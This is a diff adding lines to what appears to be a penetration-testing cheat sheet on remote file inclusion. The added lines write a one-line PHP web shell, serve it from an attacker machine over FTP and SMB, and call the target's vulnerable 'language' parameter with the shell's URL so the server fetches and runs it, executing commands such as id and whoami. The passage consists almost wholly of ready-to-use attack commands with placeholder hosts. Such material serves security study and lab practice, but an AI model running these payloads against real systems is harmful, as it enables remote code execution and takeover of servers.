@@ -1573,6 +1573,11 @@ $ curl -s "http://<SERVER_IP>:<PORT>/index.php?language=expect://id"
 ```
 $ echo '<?php system($_GET["cmd"]); ?>' > shell.php && python3 -m http.server <LISTENING_PORT>	Host web shell
 /index.php?language=http://<OUR_IP>:<LISTENING_PORT>/shell.php&cmd=id
+$ echo '<?php system($_GET["cmd"]); ?>' > shell.php && sudo python -m pyftpdlib -p 21	Host web shell
+/index.php?language=ftp://<OUR_IP>:<LISTENING_PORT>/shell.php&cmd=id
+$ curl 'http://<SERVER_IP>:<PORT>/index.php?language=ftp://user:pass@localhost/shell.php&cmd=id'
+$ echo '<?php system($_GET["cmd"]); ?>' > shell.php && impacket-smbserver -smb2support share $(pwd)	Host web shell
+/index.php?language=\\<OUR_IP>\share\shell.php&cmd=whoami
 ```
 
 - LFI + Upload
